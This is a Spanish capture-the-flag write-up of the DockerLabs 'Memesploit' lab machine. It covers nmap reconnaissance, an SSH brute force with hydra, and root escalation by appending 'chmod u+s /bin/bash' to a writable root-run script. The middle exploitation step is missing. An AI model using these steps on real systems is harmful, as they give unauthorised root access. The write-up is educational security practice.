## Introducción

Este documento presenta la resolución completa de la máquina **Memesploit**, desarrollada por *d1se0* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone un servidor web con pistas textuales, un servicio SMB accesible y un recurso compartido que contiene un archivo ZIP protegido. Tras extraer las credenciales del ZIP, se obtiene acceso SSH como `memesploit`.
Una vez dentro, se identifica que el usuario puede reiniciar el servicio `login_monitor` como root, y el script `actionban.sh` ejecutado por este servicio es modificable. Se inyecta código para establecer el bit SUID en `/bin/bash`, forzando la ejecución del script mediante un ataque de fuerza bruta SSH y obteniendo acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Memesploit.zip
sudo bash auto_deploy.sh Memesploit.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Memesploit/{content,exploits,nmap,scripts}
cd Memesploit
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP
* **139/tcp** — SMB
* **445/tcp** — SMB

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1771222673/Ports_rotkrj.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80,139,445 172.17.0.2
```

## Paso 3 — Escalada de privilegios

### 3.1 De memesploit → root

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1771222703/Sudo-l_dednln.png)

Se puede reiniciar `login_monitor` como root. El script `/etc/login_monitor/actionban.sh` es modificable.

Se añade al final del script:

```bash
chmod u+s /bin/bash
```

Se reinicia el servicio:

```bash
sudo service login_monitor restart
```

Se fuerza la ejecución del script con un ataque de fuerza bruta SSH:

```bash
hydra -l memesploit -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64
```

```bash
bash -p
```
